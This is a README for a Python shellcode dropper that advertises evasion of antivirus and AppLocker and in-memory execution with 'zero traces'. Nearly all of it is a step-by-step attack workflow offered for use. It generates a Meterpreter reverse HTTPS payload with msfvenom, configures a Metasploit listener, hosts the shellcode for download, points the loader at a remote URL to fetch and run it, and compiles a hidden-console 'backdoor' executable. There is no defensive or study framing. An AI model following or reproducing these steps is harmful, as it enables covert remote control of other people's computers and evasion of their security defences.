# 🧪 PyStageless  Stageless Shellcode Dropper in Python

![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?logo=python&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-10%2B-0078D6?logo=windows)
![Fileless](https://img.shields.io/badge/Execution-In%20Memory-success)
![Stealth](https://img.shields.io/badge/Stealth-100%25-red)
![License](https://img.shields.io/badge/License-MIT-yellow)

> **Download → Allocate → Execute → Vanish**  
> Pure Python stageless shellcode loader. No files on disk. Zero traces. 
Pure chaos.

### ✨ Features
- Downloads raw shellcode from remote URL  
- Executes directly in memory via `ctypes`  
- Runs in background thread  
- Bypasses AppLocker & most AV by default  
- Works with Cobalt Strike, Meterpreter, custom payloads  

## 🚀 Quick Start

### Payload Development - msfvenom

```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.69.27.216 LPORT=4455 LURI=/api/v1/data/ HTTPUSERAGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76" -f  raw > shellcode.bin
```
---

### MSf

```bash
msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https
msf exploit(multi/handler) > set LHOST 10.69.27.216
LHOST => 10.69.27.216
msf exploit(multi/handler) > set LPORT 4455
LPORT => 4455
msf exploit(multi/handler) >  set luri /api/v1/data/
luri => /api/v1/data/
msf exploit(multi/handler) > run
```

---

### Host your shellcode

```bash
python -m http.server 80
```

### Edit URL in script

```bash
SHELLCODE_URL = "http://your-ip:80/shellcode.bin"
```

### Run

```bash
python pystageless.py
```

### Standalone exe compilation.

```bash
python -m PyInstaller -F backdoor.py --noconsole
```


